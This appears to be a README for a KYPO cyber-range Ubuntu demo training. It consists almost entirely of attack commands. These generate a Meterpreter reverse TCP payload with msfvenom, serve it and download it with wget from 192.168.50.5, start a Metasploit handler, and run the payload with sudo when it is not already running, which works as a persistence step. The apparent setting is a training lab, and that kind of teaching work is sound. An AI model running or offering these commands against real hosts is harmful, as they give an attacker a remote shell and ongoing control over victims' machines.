# kypo-crp-demo-training-ubuntu

USE MSFVENOM

(Stageless payload)

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.50.5 LPORT=6996 -f elf -o /var/www/html/shell-x64.elf

---

wget http://192.168.50.5/shell-x64.elf

chmod +x shell-x64.elf

---

if [ ! -s /home/server/shell-x64.elf ]; then wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf; fi

if [ -s /home/server/shell-x64.elf ]; then chmod +x /home/server/shell-x64.elf; fi

---

use exploit/multi/handler

set PAYLOAD linux/x64/meterpreter_reverse_tcp

set LPORT 6996

set LHOST 192.168.50.5

exploit

---

if ! pidof -x /home/server/shell-x64.elf; then sudo /home/server/shell-x64.elf; fi
